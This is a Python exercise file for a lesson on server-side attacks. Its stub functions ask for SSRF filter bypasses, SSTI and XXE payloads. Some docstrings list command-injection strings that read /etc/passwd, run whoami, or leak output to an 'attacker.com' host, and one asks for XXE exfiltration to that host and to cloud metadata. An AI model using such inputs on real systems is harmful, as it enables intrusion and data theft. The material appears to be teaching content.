"""
Exercises for Lesson 07: Server-Side Attacks
Topic: Cybersecurity_Offensive

Practice problems covering SSRF, XXE, SSTI, command injection,
and deserialization vulnerabilities.
"""


# === Exercise 1: SSRF Payload Crafting ===
# Problem: Given a URL fetch feature, craft SSRF payloads to access
# internal resources. Bypass common filters.

def exercise_1():
    """
    The application fetches URLs via: GET /fetch?url=<user_input>
    Filters block: "localhost", "127.0.0.1", "internal"

    Craft payloads to access http://127.0.0.1:8080/admin using:
      A. Decimal IP notation
      B. IPv6 notation
      C. DNS rebinding (use a domain that resolves to 127.0.0.1)
      D. URL encoding bypass
    Return dict {"A": url, "B": url, "C": url, "D": url}
    """
    # TODO: Craft SSRF bypass payloads
    pass


# === Exercise 2: Command Injection Sanitizer ===
# Problem: Identify which inputs are vulnerable to OS command injection.
# Given a function that runs: os.system(f"ping -c 1 {user_input}"),
# determine which inputs would execute additional commands.

def exercise_2():
    """
    test_inputs = [
        "8.8.8.8",
        "8.8.8.8; cat /etc/passwd",
        "8.8.8.8 && whoami",
        "8.8.8.8 | id",
        "$(whoami).attacker.com",
        "8.8.8.8`whoami`",
    ]
    For each, return {"input": str, "dangerous": bool, "technique": str}
    Techniques: "safe", "semicolon", "and_chain", "pipe",
                "command_substitution", "backtick"
    """
    # TODO: Analyze each input for command injection
    pass


# === Exercise 3: SSTI Detection ===
# Problem: Given template engine responses to probe inputs,
# identify the template engine and craft an exploitation payload.

def exercise_3():
    """
    probe_results = {
        "{{7*7}}": "49",           # Rendered
        "${7*7}": "${7*7}",         # Not rendered
        "#{7*7}": "#{7*7}",        # Not rendered
        "{{7*'7'}}": "7777777",    # String multiplication
    }
    Based on these results:
      1. Which template engine is this? (Jinja2/Twig/Mako/Freemarker)
      2. What is a payload to read /etc/passwd?
      3. What is a payload to get RCE?
    Return dict with keys: engine, read_file_payload, rce_payload
    """
    # TODO: Identify template engine and craft payloads
    pass


# === Exercise 4: XXE Payload Builder ===
# Problem: Build XXE payloads for different exploitation goals.

def exercise_4():
    """
    Build XML payloads for:
      A. Read /etc/passwd via external entity
      B. SSRF to http://169.254.169.254/latest/meta-data/ (AWS metadata)
      C. Blind XXE with out-of-band data exfiltration to http://attacker.com/

    Return dict {"A": xml_string, "B": xml_string, "C": xml_string}
    Each should be a valid XML document with DOCTYPE and entity definitions.
    """
    # TODO: Build XXE payloads
    pass


if __name__ == "__main__":
    print("=== Exercise 1: SSRF Payload Crafting ===")
    print(exercise_1())
    print("\n=== Exercise 2: Command Injection Sanitizer ===")
    print(exercise_2())
    print("\n=== Exercise 3: SSTI Detection ===")
    print(exercise_3())
    print("\n=== Exercise 4: XXE Payload Builder ===")
    print(exercise_4())
